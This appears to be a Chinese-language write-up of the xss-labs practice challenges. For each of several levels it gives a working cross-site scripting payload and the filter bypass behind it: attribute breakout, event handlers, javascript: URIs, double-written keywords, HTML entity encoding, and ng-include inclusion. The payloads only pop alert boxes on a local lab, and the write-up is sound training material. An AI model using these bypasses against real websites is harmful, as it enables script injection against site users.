### level2

传入`<script>alert(1);</script>`后发现被带入到input标签，并且没有转义
所以构造
`payload:"><script>alert(1);</script>`

### level3

发现闭合为单引号
尝试：`'><script>alert(1);</script>`
`<input name=keyword value=''&gt;&lt;script&gt;alert(1);&lt;/script&gt;'>`
发现被<,>被转义
于是使用触发器onfocus,onmouseover,onclick
构造`payload: ' onfocus=javascript:alert(1) '`

### level5
查看源码发现是使用双引号闭合，尝试上传：`"><script>alert(0);</script>`

传on也同样出现被转换为o_n的情况
也就是上述的两种办法都不行
==但是可以利用 JavaScript 的 URI==
`payload: ?keyword="> <a href=javascript:alert(1)>hack</a>`

### level7
尝试过后，会发现这关里 `script` 这个字符串会被过滤，即替换为空字符串。
然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，`scriscriptpt` 被扫描替换一次后，会变成 `script`。
`payload: "><scrscriptipt>alert(1);</scrscriptipt>`
### level8
这一关开始出现两个可以进行xss攻击的地方

在input标签处，经过测试，会对",<,>进行转义，导致无法闭合input标签
在<a href标签处，会对script，on进行替换
使用html实体编码绕过
`payload：java&#x0073;cript:alert(1)`
编码格式：
- &# + 字符的ascii编码的十进制
- 或&#x+字符的ascii编码的十六进制
### level9
上传上一题的payload提示连接不合法，如果上传http://test，则是一个合法的链接
经过尝试可以发现，后端只检测传入的链接字符串是否包含 `http://`，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 `http://` 就行了。
`payload: java&#x0073;cript:alert(1)//http://`
### level10
http://127.0.0.1/xss-labs/level10.php?keyword=well%20done!

可以发现有隐藏的可上传参数
构造payload:
`?keyword=well done!&t_link=1&t_history=2&t_sort=3`

发现t_sort这个参数可以进行攻击
经过尝试，会将<>替换为空字符，于是使用onmouseover进行攻击
构造
`payload:?keyword=well done!&t_link=1&t_history=2&t_sort=" onmouseover=javascript:alert(0) "`
但是由于type 仍然是hidden，不可见，所以页面没有反应
payload:
`?keyword=well done!&t_link=1&t_history=2&t_sort=" onmouseover=javascript:alert(0) type "`
手动添加一个type覆盖掉后面，就出现了一个框，就成功了

### level15
查看页面源码发现了一个新属性，`ng-include`，ng-include指令一般用于包含外部HTML文件，ng-include属性的值可以是一个表达式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一域名下，也就是要调用同一域名下的其他网页。
传参：?src=1
发现出现在了ng-include的值的位置，
传参src=' level1.php '
网页包含了level1的画面
构造payload:
`?src=' level1.php?name=<img src=1 onerror=javascript:alert(1)> '`
成功
